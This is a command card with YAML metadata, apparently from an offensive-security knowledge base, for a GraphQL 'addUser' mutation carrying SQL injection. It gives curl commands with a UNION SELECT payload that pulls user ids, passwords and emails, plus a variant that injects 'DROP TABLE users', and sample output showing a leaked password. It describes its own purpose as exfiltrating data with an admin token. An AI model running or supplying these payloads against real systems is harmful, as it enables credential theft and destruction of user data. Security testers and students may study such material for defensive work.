---
type: command
executor: bash
data: >-
  curl -X POST http://target.com/graphql -H "Content-Type: application/json" -H
  "Authorization: Bearer $_ADMIN_TOKEN" -d '{"query": "mutation { addUser(id:
  \"1\", name: \"Dan Abramov\"; email: \"dan@dan.com\"; UNION SELECT id,
  password, email FROM users -- ) { id name email } }"}'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Web
tags:
  - graphql
  - injection
  - sql
verified: true
validated: true
---

# graphql-add-user-injection-mutation

## Command

```bash
curl -X POST $_ENDPOINT \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $_ADMIN_TOKEN" \
  -d '{"query": "mutation { addUser(id: \"$_ID\", name: \"$_NAME\"; $_INJECTION_PAYLOAD ) { id name email } }"}'
```

## Description

Executes a GraphQL addUser mutation with an injected SQL payload to attempt credential extraction. Requires prior admin authentication. Use to exfiltrate data via vulnerable backend SQL queries.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ENDPOINT | Target GraphQL endpoint URL | Yes |
| $_ADMIN_TOKEN | Bearer token from admin signIn | Yes |
| $_ID | User ID for the fake account | No |
| $_NAME | Name field for injection point | No |
| $_INJECTION_PAYLOAD | SQL injection string (e.g., email: \"dan@dan.com\"; UNION SELECT id, password, email FROM users -- ) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..." \
  -d '{"query": "mutation { addUser(id: \"1\", name: \"Dan Abramov\"; email: \"dan@dan.com\"; UNION SELECT id, password, email FROM users -- ) { id name email } }"}'
```

### Advanced Usage

Inject into multiple fields or adjust for MySQL/PostgreSQL:

```bash
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $_ADMIN_TOKEN" \
  -d '{"query": "mutation { addUser(id: \"1\", name: \"'; DROP TABLE users; -- \", email: \"injected@evil.com\") { id name email } }"}'
```

## Expected Output

If injection succeeds, response leaks data:

```json
{
  "data": {
    "addUser": {
      "id": "1",
      "name": "Dan Abramov",
      "email": "victim@email.com:password123"
    }
  }
}
```

Failure (sanitized):

```json
{
  "errors": [
    {
      "message": "Invalid input"
    }
  ]
}
```

## Related

- [[procedures/GraphQL-Injection-via-Mutations-for-Credential-Theft-and-User-Addition]]
